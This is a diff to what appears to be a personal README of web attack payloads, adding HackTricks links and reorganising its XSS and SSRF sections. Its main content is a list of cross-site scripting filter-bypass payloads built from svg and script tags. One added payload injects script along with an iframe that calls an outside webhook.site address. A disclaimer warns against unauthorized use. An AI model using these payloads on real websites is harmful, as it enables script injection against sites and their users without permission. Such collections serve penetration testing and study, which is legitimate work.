@@ -5,7 +5,7 @@
 <br>
 
 
-# XSS
+# [XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
 - XSS payloads <br>
 
 <br>
@@ -20,7 +20,7 @@
 > Do not use these payloads in a random or unauthorized web site, I do not take any resposibility <br>
 > to any person who decide to execute those on random places, you have been warned!
 
-## Payloads <br>
+## XSS Payloads <br>
 
 ```html
 </script><svg><script/class=rodric>alert(1)</script>-%26apos;
@@ -37,17 +37,23 @@
 <!--><svg/onload=window.alert();//
 ```
 
+## XSS + SSRF <br>
+
+```html
+;//<!----><SCRIPT>alert(1);</SCRIPT><iframe src="https://webhook.site/YOUR_HOOK"></iframe>
+```
+
 <br>
 
 <hr>
 
 <br>
 
-# SSRF
-- Personally created SSRF payloads <br>
+# [SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
+- SSRF payloads <br>
 
 ```html
-;//<!----><SCRIPT>alert(1);</SCRIPT><iframe src="https://webhook.site/YOUR_HOOK"></iframe>
+
 ```
 
 <br>
